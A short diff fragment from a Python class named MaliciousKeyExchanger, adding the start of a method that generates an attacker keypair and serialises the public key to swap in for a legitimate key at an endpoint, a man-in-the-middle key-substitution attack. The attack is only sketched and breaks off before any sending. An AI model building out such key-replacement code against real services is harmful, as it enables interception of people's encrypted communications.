@@ -26,3 +26,8 @@ class MaliciousKeyExchanger:
 
 #Execute attack by replacing legitimate key
     def execute_key_replacement(self, endpoint_url):
+        attacker_private_key, attacker_public_key = self.create_attack_keypair()
+
+        # Convert the attacker's public key to a format suitable for transmission
+        pem_public_key = self.serialize_public_key(attacker_public_key)
+        
